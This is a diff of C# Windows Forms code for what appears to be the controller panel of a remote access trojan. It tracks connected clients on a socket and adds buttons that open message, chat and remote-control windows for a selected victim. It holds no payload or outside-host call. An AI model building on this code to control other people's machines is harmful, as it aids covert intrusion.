@@ -33,7 +33,7 @@ namespace WindowsFormsApplication1
         // StreamReader SR;
         Socket RatSock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
         List<int> ItemIndexList = new List<int>();
-        NetworkStream[] NSArray = new NetworkStream[9999];
+        public NetworkStream[] NSArray = new NetworkStream[9999];
         int IDNum = 1;
         int Connected = 0;
         bool running = false;
@@ -78,7 +78,6 @@ namespace WindowsFormsApplication1
                     Thread RATClient = new Thread(() => Client(Item, IDNum));
                     RATClient.Start();
                     ItemIndex++;
-                    IDNum++;
                 }
 
                 catch { }
@@ -90,7 +89,9 @@ namespace WindowsFormsApplication1
         void Client(ListViewItem Item, int ID)
         {
             NetworkStream NS = new NetworkStream(RatSock);
+            MessageBox.Show(ID.ToString());
             NSArray[ID] = NS;
+            IDNum++;
             StreamWriter SW = new StreamWriter(NS);
             StreamReader SR = new StreamReader(NS);
             StringBuilder Input = new StringBuilder();
@@ -209,19 +210,19 @@ namespace WindowsFormsApplication1
             Environment.Exit(0);
         }
 
-        protected override void WndProc(ref Message m)
-        {
-            if (m.Msg == 0x0112) // WM_SYSCOMMAND
-            {
+       // protected override void WndProc(ref Message m)
+       // {
+           // if (m.Msg == 0x0112) // WM_SYSCOMMAND
+           // {
                 // Check your window state here
-                if (m.WParam == new IntPtr(0xF030)) // Maximize event - SC_MAXIMIZE from Winuser.h
-                {
+                //if (m.WParam == new IntPtr(0xF030)) // Maximize event - SC_MAXIMIZE from Winuser.h
+               // {
                     // THe window is being maximized
                     //MessageBox.Show("wat");
-                }
-            }
-            base.WndProc(ref m);
-        }
+               // }
+           // }
+            //base.WndProc(ref m);
+       // }
 
         private void metroShell1_Click_1(object sender, EventArgs e)
         {
@@ -266,6 +267,20 @@ namespace WindowsFormsApplication1
         private void buttonItem19_Click(object sender, EventArgs e)
         {
             //MESSAGE FUNCTION
+            Message MessageWND = new Message();
+            MessageWND.ShowDialog();
+        }
+
+        private void buttonItem34_Click(object sender, EventArgs e)
+        {
+            Chat Chatbox = new Chat();
+            Chatbox.ShowDialog();
+        }
+
+        private void buttonItem32_Click(object sender, EventArgs e)
+        {
+           Remote Remote = new Remote(NSArray[Convert.ToInt32(listViewEx1.SelectedItems[0].Text)]);
+           Remote.ShowDialog();
         }
     }
 }
